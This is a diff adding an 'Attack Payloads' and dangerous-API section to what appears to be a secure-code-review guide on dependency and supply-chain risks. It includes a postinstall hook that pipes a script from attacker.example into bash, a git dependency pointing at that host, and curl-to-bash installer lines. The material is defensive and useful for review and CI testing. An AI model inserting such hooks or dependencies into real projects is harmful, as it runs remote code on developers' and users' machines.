@@ -31,6 +31,137 @@ The unsafe assumption is that `npm install`, `go get`, or Maven Central always d
 | **Typosquatting** | Package names close to but not matching canonical registry entries |
 | **Base images** | Outdated Docker `FROM` tags without digest pinning or regular rebuilds |
 
+## Attack Payloads
+
+Use these patterns in authorized dependency review, SBOM diffing, and CI policy tests—not to install unverified packages on production systems.
+
+### Pattern 1: Typosquatting package names
+
+```text
+reqeusts          # requests
+python-dateutil   # python-dateutil vs python-datelutil
+@types/node       # scoped typosquats in npm
+django-admin      # unrelated to django
+```
+
+Compare package names character-by-character against canonical registry entries.
+
+### Pattern 2: Dependency confusion (internal name squatting)
+
+```text
+# Public registry publishes same name as internal private package
+pip install company-utils  # resolves to public typosquat if index misconfigured
+npm install @company/auth-lib  # public scope squatted
+```
+
+### Pattern 3: Malicious install scripts
+
+```json
+{
+  "scripts": {
+    "postinstall": "curl https://attacker.example/s.sh | bash"
+  }
+}
+```
+
+Review `postinstall`, `preinstall`, and `prepare` in `package.json` and equivalent hooks in other ecosystems.
+
+### Pattern 4: Unpinned transitive upgrade
+
+```text
+# requirements.txt: django>=3.0
+# Lockfile not committed — CI pulls latest transitive deps each build
+# New sub-dependency version introduces CVE or compromised maintainer
+```
+
+### Pattern 5: Known vulnerable version left in place
+
+```text
+log4j-core:2.14.0
+pyyaml:5.1
+urllib3:1.24.1
+spring-core:5.3.0  # check against OSV/GitHub Advisory
+```
+
+## Language-Specific Sinks and Dangerous APIs
+
+### Python
+
+```text
+# requirements.txt — no hashes, floating versions
+requests>=2.0
+django>=3.0
+```
+
+```python
+subprocess.run(["pip", "install", "-r", "requirements.txt"])
+pip.main(["install", user_supplied_package])
+import pkg_resources; pkg_resources.require(user_input)
+```
+
+Also review: `pip.conf` index URL, Poetry without lockfile commit, `setup.py install` from git URLs.
+
+### Java
+
+```xml
+<dependency>
+  <version>LATEST</version>
+  <version>[1.0,)</version>  <!-- open range -->
+</dependency>
+```
+
+```java
+URLClassLoader.newInstance(urls);  // loads JAR from user path
+ScriptEngine with classpath from untrusted plugin dir
+```
+
+Gradle: dynamic versions `1.+`, `latest.release`; missing `dependency-lock`.
+
+### C#
+
+```xml
+<PackageReference Include="Newtonsoft.Json" Version="*" />
+<PackageReference Include="Evil.Package" Version="1.0.0" />  <!-- unreviewed -->
+```
+
+```csharp
+Assembly.LoadFrom(userSuppliedPath);
+dotnet add package from unverified feed
+```
+
+### JavaScript
+
+```json
+"dependencies": {
+  "lodash": "latest",
+  "some-package": "git+https://attacker.example/pkg.git"
+}
+```
+
+```javascript
+require(userControlledModule);
+child_process.exec('npm install ' + packageName);
+```
+
+### Go
+
+```go
+// go.mod without go.sum committed
+require github.com/example/legacy v0.0.0-20180101000000-deadbeef
+go get -u ./...  // unpinned upgrade in CI
+plugin.Open(userPath)
+```
+
+### Shell / Docker
+
+```bash
+curl -sSL https://install.example.com/setup.sh | bash
+pip install -r requirements.txt  # no hash check
+npm install --ignore-scripts=false
+FROM python:3.8-slim  # no digest pin
+RUN pip install package-from-git
+```
+
 ## Sample Vulnerable Code in Python
 
 ```text
